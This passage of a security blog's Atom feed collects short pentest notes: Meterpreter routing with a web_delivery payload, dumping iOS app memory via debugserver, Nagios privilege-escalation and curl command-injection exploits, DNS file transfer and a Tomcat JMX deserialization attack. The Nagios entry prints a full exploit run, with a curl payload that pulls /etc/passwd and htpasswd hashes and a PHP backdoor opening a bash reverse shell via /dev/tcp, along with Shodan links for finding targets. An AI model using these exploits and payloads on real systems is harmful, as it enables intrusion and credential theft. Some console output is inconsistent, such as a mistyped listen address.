class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; route add 192.168.0.105 255.255.255.0 1</span><br><span class="line">[*] Route added</span><br><span class="line">msf auxiliary(web_delivery) &gt; route print</span><br><span class="line">Active Routing Table</span><br><span class="line">====================</span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.0.105      255.255.255.255    Session 1</span><br><span class="line">msf auxiliary(web_delivery) &gt; set LHOST 192.168.0.105</span><br><span class="line">RHOST =&gt; 192.168.0.105</span><br><span class="line">msf exploit(web_delivery) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/script/web_delivery):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   SRVHOST  0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT  8089             yes       The local port to listen on.</span><br><span class="line">   SSL      false            no        Negotiate SSL for incoming connections</span><br><span class="line">   SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)</span><br><span class="line">   URIPATH                   no        The URI to use for this exploit (default is random)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (python/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST  192.68.0.105     yes       The listen address</span><br><span class="line">   LPORT  4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Python</span><br><span class="line">msf auxiliary(web_delivery) &gt; run</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-portfwd&quot;&gt;&lt;a href=&quot;#0x01-portfwd&quot; class=&quot;headerlink&quot; title=&quot;0x01 portfwd&quot;&gt;&lt;/a&gt;0x01 portfwd&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;
      
    
    </summary>
    
    
      <category term="Meterpreter" scheme="https://blog.safebuff.com/tags/Meterpreter/"/>
    
  </entry>
  
  <entry>
    <title>Dumping Memory on iOS</title>
    <link href="https://blog.safebuff.com/2016/12/28/Dumping-Memory-on-iOS/"/>
    <id>https://blog.safebuff.com/2016/12/28/Dumping-Memory-on-iOS/</id>
    <published>2016-12-28T05:02:59.000Z</published>
    <updated>2018-10-12T07:36:11.551Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Tools"><a href="#0x01-Tools" class="headerlink" title="0x01 Tools"></a>0x01 Tools</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LLDB (http://lldb.llvm.org/)</span><br><span class="line">Debugserver</span><br><span class="line">Tcprelay.py ([https://github.com/xl7dev/SecTools/tree/master/iOSTool])</span><br></pre></td></tr></table></figure><h4 id="Setting-Debugserver"><a href="#Setting-Debugserver" class="headerlink" title="Setting Debugserver"></a>Setting Debugserver</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">1. via usb to connect mobile and MacOS</span><br><span class="line">2. open xcode&gt;&gt;Window&gt;&gt;Devices</span><br><span class="line">3. scp root@iOSIP:/Developer/usr/bin/debugserver ~/debugserver</span><br><span class="line">4. lipo -thin arm64 ~/debugserver -output ~/debugserver</span><br><span class="line"></span><br><span class="line">armv6设备： iPhone, iPhone2, iPhone3G, 第一代、第二代 iPod Touch</span><br><span class="line"></span><br><span class="line">armv7设备：iPhone3GS iPhone4,iPhone4S iPad, iPad2, iPad3(The New iPad), iPad mini iPod Touch 3G, iPod Touch4</span><br><span class="line"></span><br><span class="line">armv7s设备：iPhone5,iPhone5C, iPad4(iPad with Retina Display)</span><br><span class="line"></span><br><span class="line">arm64设备：iPhone5S, iPad Air, iPad mini2(iPad mini with Retina Display)</span><br><span class="line"></span><br><span class="line">5. wget http://7xibfi.com1.z0.glb.clouddn.com/uploads/default/668/c134605bb19a433f.xml -O ent.xml</span><br><span class="line"></span><br><span class="line">6. ldid -Sent.xml debugserver</span><br><span class="line">7. scp debugserver root@iOSIP:/usr/bin/debugserver</span><br><span class="line">8. ssh root@iOSIP</span><br><span class="line">9. chmod +x debugserver</span><br></pre></td></tr></table></figure><h3 id="0x02-Debugserver-attack-pid"><a href="#0x02-Debugserver-attack-pid" class="headerlink" title="0x02 Debugserver attack pid"></a>0x02 Debugserver attack pid</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&gt; python tcprelay.py -t 22:2222 1234:1234</span><br><span class="line">Forwarding local port 2222 to remote port 22</span><br><span class="line">Forwarding local port 1234 to remote port 1234</span><br><span class="line">Incoming connection to 2222</span><br><span class="line">Waiting for devices...</span><br><span class="line">Connecting to device &lt;MuxDevice: ID 17 ProdID 0x12a8 Serial &apos;0ea150b00ba3deeacb42f399492b7990416a0c87&apos; Location 0x14120000&gt;</span><br><span class="line">Connection established, relaying data</span><br><span class="line">Incoming connection to 1234</span><br><span class="line">Waiting for devices...</span><br><span class="line">Connecting to device &lt;MuxDevice: ID 17 ProdID 0x12a8 Serial &apos;0ea150b00ba3deeacb42f399492b7990416a0c87&apos; Location 0x14120000&gt;</span><br><span class="line">Connection established, relaying data</span><br><span class="line">&gt; ssh root@127.0.0.1 -p 2222</span><br><span class="line">IPhone5S:~ root# ./debugserver *:1234 -a appname</span><br><span class="line">&gt; lldb</span><br><span class="line">(lldb) process connect connect://127.0.0.1:1234</span><br><span class="line">(lldb) image dump sections appname</span><br><span class="line"></span><br><span class="line">Sections for &apos;/private/var/mobile/Containers/Bundle/Application/F3CFF345-71FC-47C4-B1FB-3DAC523C7627/appname.app/appname(0x0000000000047000)&apos; (armv7):</span><br><span class="line"> SectID     Type    Load Address   File Off     File Size   Flags      Section Name</span><br><span class="line"> ------ ---------------- --------------------------------------- ---------- ---------- ---------- ----------------------------</span><br><span class="line"> 0x00000100 container   [0x0000000000000000-0x0000000000004000)* 0x00000000 0x00000000 0x00000000 appname.__PAGEZERO</span><br><span class="line"> 0x00000200 container   [0x0000000000047000-0x00000000001af000) 0x00000000 0x00168000 0x00000000 appname.__TEXT</span><br><span class="line"> 0x00000001 code    [0x000000000004e6e8-0x000000000016d794) 0x000076e8 0x0011f0ac 0x80000400 appname.__TEXT.__text</span><br><span class="line"> 0x00000002 code    [0x000000000016d794-0x000000000016e5e0) 0x00126794 0x00000e4c 0x80000400 appname.__TEXT.__stub_helper</span><br><span class="line"> 0x00000003 data-cstr   [0x000000000016e5e0-0x0000000000189067) 0x001275e0 0x0001aa87 0x00000002 appname.__TEXT.__cstring</span><br><span class="line"> 0x00000004 data-cstr   [0x0000000000189067-0x00000000001a5017) 0x00142067 0x0001bfb0 0x00000002 appname.__TEXT.__objc_methname</span><br><span class="line"> 0x00000005 data-cstr   [0x00000000001a5017-0x00000000001a767a) 0x0015e017 0x00002663 0x00000002 appname.__TEXT.__objc_classname</span><br><span class="line"> 0x00000006 data-cstr   [0x00000000001a767a-0x00000000001abe0c)</span><br></pre></td></tr></table></figure><p>###0x03 dump memory<br>example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000003 data-cstr    [0x000000000016e5e0-0x0000000000189067) 0x001275e0 0x0001aa87 0x00000002 appname.__TEXT.__cstring</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(lldb) memory read --outfile ~/0x00000003data-cstr 0x000000000016e5e0 0x0000000000189067 –force</span><br></pre></td></tr></table></figure><p>ios7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.netspi.com/ios-tutorial-dumping-the-application-heap-from-memory</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-Tools&quot;&gt;&lt;a href=&quot;#0x01-Tools&quot; class=&quot;headerlink&quot; title=&quot;0x01 Tools&quot;&gt;&lt;/a&gt;0x01 Tools&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;t
      
    
    </summary>
    
    
      <category term="iOS" scheme="https://blog.safebuff.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>Nagios Exploit Root PrivEsc CVE-2016-9566</title>
    <link href="https://blog.safebuff.com/2016/12/16/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566/"/>
    <id>https://blog.safebuff.com/2016/12/16/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566/</id>
    <published>2016-12-16T02:35:37.000Z</published>
    <updated>2018-10-12T07:36:11.573Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-VULNERABILITY"><a href="#0x01-VULNERABILITY" class="headerlink" title="0x01 VULNERABILITY"></a>0x01 VULNERABILITY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nagios Core &lt; 4.2.4 - Root Privilege Escalation</span><br></pre></td></tr></table></figure><h3 id="0x02-POC"><a href="#0x02-POC" class="headerlink" title="0x02 POC"></a>0x02 POC</h3><p><a href="https://gist.github.com/xl7dev/322b0f85dc9f6a06573302c7de4f4249" target="_blank" rel="noopener">nagios-root-privesc.sh</a></p><h3 id="0x03-Usage"><a href="#0x03-Usage" class="headerlink" title="0x03 Usage"></a>0x03 Usage</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ./nagios-root-privesc.sh /usr/local/nagios/var/nagios.log</span><br></pre></td></tr></table></figure><h3 id="0x04-SOLUTION"><a href="#0x04-SOLUTION" class="headerlink" title="0x04 SOLUTION"></a>0x04 SOLUTION</h3><p>Vendor received this advisory in advance and released a security<br>release of Nagios 4.2.4 to address this vulnerability.</p><h3 id="0x05-Reference"><a href="#0x05-Reference" class="headerlink" title="0x05 Reference"></a>0x05 Reference</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://legalhackers.com/advisories/Nagios-Exploit-Root-PrivEsc-CVE-2016-9566.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-VULNERABILITY&quot;&gt;&lt;a href=&quot;#0x01-VULNERABILITY&quot; class=&quot;headerlink&quot; title=&quot;0x01 VULNERABILITY&quot;&gt;&lt;/a&gt;0x01 VULNERABILITY&lt;/h3&gt;&lt;figure c
      
    
    </summary>
    
    
      <category term="PrivEsc" scheme="https://blog.safebuff.com/tags/PrivEsc/"/>
    
  </entry>
  
  <entry>
    <title>Nagios Exploit Command Injection CVE-2016-9565</title>
    <link href="https://blog.safebuff.com/2016/12/14/Nagios-Exploit-Command-Injection-CVE-2016-9565/"/>
    <id>https://blog.safebuff.com/2016/12/14/Nagios-Exploit-Command-Injection-CVE-2016-9565/</id>
    <published>2016-12-14T09:17:16.000Z</published>
    <updated>2018-10-12T07:36:11.572Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-VULNERABILITY-effect"><a href="#0x01-VULNERABILITY-effect" class="headerlink" title="0x01 VULNERABILITY effect"></a>0x01 VULNERABILITY effect</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Both of the Nagios Core stable branches 3.x and 4.x are affected</span><br><span class="line">Nagios Core &lt; 4.2.2        Curl Command Injection / Code Execution</span><br></pre></td></tr></table></figure><h3 id="0x02-WebSite"><a href="#0x02-WebSite" class="headerlink" title="0x02 WebSite"></a>0x02 WebSite</h3><p><a href="https://www.nagios.org" target="_blank" rel="noopener">Nagios Core</a></p><h3 id="0x03-Search-Target"><a href="#0x03-Search-Target" class="headerlink" title="0x03 Search Target"></a>0x03 Search Target</h3><p><a href="https://www.zoomeye.org/search?t=host&amp;q=Nagios+Core" target="_blank" rel="noopener">Zoomeye</a>  Total results: 252</p><p><a href="https://www.shodan.io/search?query=Nagios+Core" target="_blank" rel="noopener">Shodan</a>    Total results: 36</p><h3 id="0x04-POC"><a href="#0x04-POC" class="headerlink" title="0x04 POC"></a>0x04 POC</h3><p><a href="https://gist.github.com/xl7dev/bf2f2f91ecee6fbe0675fd59492bef20" target="_blank" rel="noopener">nagios_cmd_injection.py</a></p><p><a href="https://legalhackers.com/videos/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html" target="_blank" rel="noopener">Video POC</a></p><p><strong>Usage</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">Example exploit run</span><br><span class="line">~~~~~~~~~~~~~~~~~~~~~</span><br><span class="line"></span><br><span class="line">root@xenial:~/nagios-exploit# ./nagios_cmd_injection.py 192.168.57.3</span><br><span class="line"></span><br><span class="line">Nagios Core &lt; 4.2.0 Curl Command Injection PoC Exploit (CVE-2016-9565)</span><br><span class="line">nagios_cmd_injection.py  ver. 1.0</span><br><span class="line"></span><br><span class="line">Discovered &amp; Coded by:</span><br><span class="line"></span><br><span class="line"> Dawid Golunski</span><br><span class="line"> https://legalhackers.com</span><br><span class="line"></span><br><span class="line">[+] Generating SSL certificate for our python HTTPS web server </span><br><span class="line"></span><br><span class="line">[+] Starting the web server on ports 80 &amp; 443 </span><br><span class="line"></span><br><span class="line">[+] Web server ready for connection from Nagios (http://target-svr/nagios/rss-corefeed.php). Time for your dnsspoof magic... ;)</span><br><span class="line"></span><br><span class="line">[+] Received GET request from Nagios server (192.168.57.4) ! Sending redirect to inject our curl payload:</span><br><span class="line"></span><br><span class="line">-Fpasswd=@/etc/passwd -Fgroup=@/etc/group -Fhtauth=@/usr/local/nagios/etc/htpasswd.users --trace-ascii /usr/local/nagios/share/nagios-backdoor.php</span><br><span class="line"></span><br><span class="line">[+] Success, curl payload injected! Received data back from the Nagios server 192.168.57.4</span><br><span class="line"></span><br><span class="line">[*] Contents of /etc/passwd file from the target:</span><br><span class="line"></span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">nagios:x:1001:1001::/home/nagios:/bin/sh</span><br><span class="line">[..cut..]</span><br><span class="line"></span><br><span class="line">[*] Contents of /usr/local/nagios/etc/htpasswd.users file:</span><br><span class="line"></span><br><span class="line">nagiosadmin:$apr1$buzCfFb$GjV/ga6PHp53qePf0</span><br><span class="line"></span><br><span class="line">[*] Retrieved nagios group line from /etc/group file on the target: nagios:x:1001:www-data</span><br><span class="line"></span><br><span class="line">[+] Happy days, &apos;www-data&apos; user belongs to &apos;nagios&apos; group! (meaning writable webroot)</span><br><span class="line"></span><br><span class="line">[*] Feed XML with JS payload returned to the client in the response. This should load nagios-backdoor.php in no time :) </span><br><span class="line"></span><br><span class="line">[+] PHP backdoor should have been saved in /usr/local/nagios/share/nagios-backdoor.php on the target by now!</span><br><span class="line"></span><br><span class="line">[*] Spawning netcat and waiting for the nagios shell (remember you can escalate to root via CVE-2016-9566 :)</span><br><span class="line"></span><br><span class="line">Listening on [0.0.0.0] (family 0, port 8080)</span><br><span class="line">Connection from [192.168.57.4] port 8080 [tcp/http-alt] accepted (family 2, sport 38718)</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ id</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(nagios),1002(nagcmd)</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ groups</span><br><span class="line">groups</span><br><span class="line">www-data nagios nagcmd</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ cat nagios-backdoor.php</span><br><span class="line">[..cut..]</span><br><span class="line">== Info: Server &lt;?php system(&quot;/bin/bash -c &apos;nohup bash -i &gt;/dev/tcp/192.168.57.3/8080 0&lt;&amp;1 2&gt;&amp;1 &amp;&apos;&quot;); die(&quot;stop processing&quot;); ?&gt; is not blacklisted</span><br><span class="line">[..cut..]</span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ ls -ld .</span><br><span class="line">ls -ld .</span><br><span class="line">drwxrwsr-x 16 nagios nagios 4096 Dec  9 20:00 .</span><br><span class="line"></span><br><span class="line">www-data@debjessie:/usr/local/nagios/share$ exit</span><br><span class="line">exit</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">[+] Shell closed</span><br><span class="line"></span><br><span class="line">[+] That&apos;s all. Exiting</span><br></pre></td></tr></table></figure></p><h3 id="0x04-Fix-Bug"><a href="#0x04-Fix-Bug" class="headerlink" title="0x04 Fix Bug"></a>0x04 Fix Bug</h3><p>Update to the latest Nagios Core release.</p><h3 id="0x05-From"><a href="#0x05-From" class="headerlink" title="0x05 From"></a>0x05 From</h3><pre><code>https://legalhackers.com/advisories/Nagios-Exploit-Command-Injection-CVE-2016-9565-2008-4796.html</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-VULNERABILITY-effect&quot;&gt;&lt;a href=&quot;#0x01-VULNERABILITY-effect&quot; class=&quot;headerlink&quot; title=&quot;0x01 VULNERABILITY effect&quot;&gt;&lt;/a&gt;0x01 VULNER
      
    
    </summary>
    
    
      <category term="Command Injection" scheme="https://blog.safebuff.com/tags/Command-Injection/"/>
    
  </entry>
  
  <entry>
    <title>Transfer files via DNS</title>
    <link href="https://blog.safebuff.com/2016/12/11/Transfer-files-via-DNS/"/>
    <id>https://blog.safebuff.com/2016/12/11/Transfer-files-via-DNS/</id>
    <published>2016-12-10T16:24:05.000Z</published>
    <updated>2018-10-12T07:36:11.598Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/breenmachine/dnsftp" target="_blank" rel="noopener">Download</a></p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><p>Server</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo python server.py -f /path/to/file</span><br></pre></td></tr></table></figure><p>Client</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; runme.bat payloadserverhostname fileparts publicdnsserver</span><br><span class="line">or </span><br><span class="line">&gt; powershell client.ps1 -server where.your.server.resolves.com</span><br></pre></td></tr></table></figure><p>Example: </p><pre><code>runme.bat payloadserver.yourdomain.com 42 8.8.8.8</code></pre><p>If just testing internally, you can use the following example:</p><pre><code>runme.bat payloadserverhostname fileparts payloadserverIPaddr</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://github.com/breenmachine/dnsftp&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Download&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&quot;Usage&quot;&gt;&lt;a href=&quot;#Usage&quot; class=&quot;h
      
    
    </summary>
    
    
      <category term="DNS" scheme="https://blog.safebuff.com/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>Apache Tomcat Remote Code Execution(CVE-2016-8735)</title>
    <link href="https://blog.safebuff.com/2016/12/05/Apache-Tomcat-Remote-Code-Execution-CVE-2016-8735/"/>
    <id>https://blog.safebuff.com/2016/12/05/Apache-Tomcat-Remote-Code-Execution-CVE-2016-8735/</id>
    <published>2016-12-05T06:56:35.000Z</published>
    <updated>2018-10-12T07:36:11.528Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-Affected-Platform"><a href="#0x01-Affected-Platform" class="headerlink" title="0x01 Affected Platform"></a>0x01 Affected Platform</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Apache Tomcat 9.0.0.M1 to 9.0.0.M11</span><br><span class="line">Apache Tomcat 8.5.0 to 8.5.6</span><br><span class="line">Apache Tomcat 8.0.0.RC1 to 8.0.38</span><br><span class="line">Apache Tomcat 7.0.0 to 7.0.72</span><br><span class="line">Apache Tomcat 6.0.0 to 6.0.47</span><br><span class="line">Earlier, unsupported versions may also be affected</span><br></pre></td></tr></table></figure><h3 id="0x02-Test-Platform"><a href="#0x02-Test-Platform" class="headerlink" title="0x02 Test Platform"></a>0x02 Test Platform</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Window2003 x86</span><br><span class="line">[POC](https://github.com/frohoff/ysoserial)</span><br><span class="line">[Apache Tomcat](http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.36/bin/apache-tomcat-8.0.36-windows-x86.zip)</span><br><span class="line">[catalina-jmx-remote](http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.36/bin/extras/catalina-jmx-remote.jar)  //add to tomcat/lib/</span><br><span class="line">[Groovy](https://repo1.maven.org/maven2/org/codehaus/groovy/groovy/2.3.9/groovy-2.3.9.jar)    //add to tomcat/lib/</span><br></pre></td></tr></table></figure><h3 id="0x03-Pentesting-Step"><a href="#0x03-Pentesting-Step" class="headerlink" title="0x03 Pentesting Step"></a>0x03 Pentesting Step</h3><h4 id="1-add-code-to-tomcat-bin-catalina-bat"><a href="#1-add-code-to-tomcat-bin-catalina-bat" class="headerlink" title="1. add code to tomcat/bin/catalina.bat"></a>1. add code to tomcat/bin/catalina.bat</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">set &quot;JAVA_OPTS=-Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;</span><br><span class="line">rem Licensed to the Apache Software Foundation (ASF) under one or more</span><br></pre></td></tr></table></figure><h4 id="2-add-code-to-tomcat-conf-server-xml"><a href="#2-add-code-to-tomcat-conf-server-xml" class="headerlink" title="2. add code to tomcat/conf/server.xml"></a>2. add code to tomcat/conf/server.xml</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.GlobalResourcesLifecycleListener&quot; /&gt;</span><br><span class="line">&lt;Listener className=&quot;org.apache.catalina.core.ThreadLocalLeakPreventionListener&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;Listener className=&quot;org.apache.catalina.mbeans.JmxRemoteLifecycleListener&quot; rmiRegistryPortPlatform=&quot;10001&quot; rmiServerPortPlatform=&quot;10002&quot; /&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- Global JNDI resources</span><br><span class="line">       Documentation at /docs/jndi-resources-howto.html</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><h4 id="3-Start-tomcat-bin-startup-bat"><a href="#3-Start-tomcat-bin-startup-bat" class="headerlink" title="3. Start tomcat/bin/startup.bat"></a>3. Start tomcat/bin/startup.bat</h4><h4 id="4-run"><a href="#4-run" class="headerlink" title="4. run"></a>4. run</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\Administrator&gt; java -cp ysoserial.jar ysoserial.exploi</span><br><span class="line">t.RMIRegistryExploit localhost 10001 Groovy1 &quot;calc.exe&quot;</span><br></pre></td></tr></table></figure><h3 id="0x04-Referer"><a href="#0x04-Referer" class="headerlink" title="0x04 Referer"></a>0x04 Referer</h3><p><a href="http://seclists.org/oss-sec/2016/q4/502" target="_blank" rel="noopener">http://seclists.org/oss-sec/2016/q4/502</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x01-Affected-Platform&quot;&gt;&lt;a href=&quot;#0x01-Affected-Platform&quot; class=&quot;headerlink&quot; title=&quot;0x01 Affected Platform&quot;&gt;&lt;/a&gt;0x01 Affected Platfo
      
    
    </summary>
    
    
      <category term="Tomcat" scheme="https://blog.safebuff.com/tags/Tomcat/"/>
    
  </entry>
  
</feed>
